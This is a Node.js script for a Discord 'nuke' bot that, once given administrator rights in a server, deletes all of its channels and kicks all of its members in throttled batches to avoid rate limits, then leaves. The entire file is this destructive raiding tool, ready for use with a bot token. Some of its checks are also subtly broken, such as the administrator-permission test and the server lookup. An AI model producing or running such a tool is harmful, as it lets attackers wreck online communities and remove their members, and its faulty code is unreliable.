const djs    = require("discord.js");
const prompt = require('prompt-sync')({sigint: true});


const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));


const client = new djs.Client({
    intents: [
        djs.Intents.FLAGS.GUILDS,
        djs.Intents.FLAGS.GUILD_BANS,
        djs.Intents.FLAGS.GUILD_INVITES,
        djs.Intents.FLAGS.GUILD_MEMBERS,
        djs.Intents.FLAGS.GUILD_MESSAGES,
        djs.Intents.FLAGS.GUILD_PRESENCES,
        djs.Intents.FLAGS.GUILD_VOICE_STATES,
        djs.Intents.FLAGS.GUILD_MESSAGE_TYPING,
        djs.Intents.FLAGS.GUILD_SCHEDULED_EVENTS,
        djs.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        djs.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        
        djs.Intents.FLAGS.DIRECT_MESSAGES,
        djs.Intents.FLAGS.DIRECT_MESSAGE_TYPING,
        djs.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    ]
});


client.on("guildCreate", async g => {
    if (g.me.permissions.missing("ADMINISTRATOR"))
        g.leave();
});


client.once("ready", _ => {
    console.log("ready");
});


const nuke = async g => {
    g = await g.fetch();

    const members  = g.members .cache;
    const channels = g.channels.cache;

    try {
        let i = 0;
        for (const channel of channels.values()) {
            channel.delete();
            i++;

            if (i%5 === 0) await sleep(2000);
        }

        i = 0;
        for (const member of members.values()) {
            member.kick();
            i++;

            if (i%5 === 0) await sleep(2000);
        }

    } finally { g.leave() }
};

async function Main () {
    ///////////////////////////////////////////////////////
    await client.login("PUT UR TOKEN RIGHT HERE");
    ///////////////////////////////////////////////////////
    
    while (true) {
        const id = prompt("Enter the ID of the guild you want to nuke: ");
    
        if (id in client.guilds.cache) {
            const guild = client.guilds.cache.get(id);
            
            if (prompt(`Are you sure to nuke \`${guild.name}\`? (y/N): `).toLowerCase() === "y")
                nuke(guild);
        }
    
        else console.log("Guild not found.");
    }
}

Main();
